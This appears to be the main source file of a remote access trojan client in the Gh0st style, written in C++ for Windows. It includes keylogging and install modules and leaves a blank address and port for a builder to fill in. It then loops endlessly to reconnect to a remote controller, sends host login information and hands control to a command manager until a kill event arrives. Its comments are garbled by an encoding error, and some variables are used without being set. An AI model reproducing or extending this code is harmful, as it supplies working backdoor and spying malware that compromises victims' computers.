
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

MODIFY_DATA modify_data = 
{
	"                                                          ",
		"",
		"",
};

#define		HEART_BEAT_TIME		1000 * 60 * 3 // ����ʱ��
HINSTANCE	g_hInstance = NULL;

DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];

int  WinMain( HINSTANCE hInstance,
			 HINSTANCE hPrevInstance, 
			 LPSTR lpCmdLine,
			 int nShowCmd)
			 
{
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;
					
				}
				// ��һ��
				Sleep(60);
			}
		}

		DWORD dwTickCount = GetTickCount();
 		if (!socketClient.Connect(modify_data.Address, atoi(modify_data.Port)))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, modify_data.Address,atoi(modify_data.Port));
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
	return 0;
}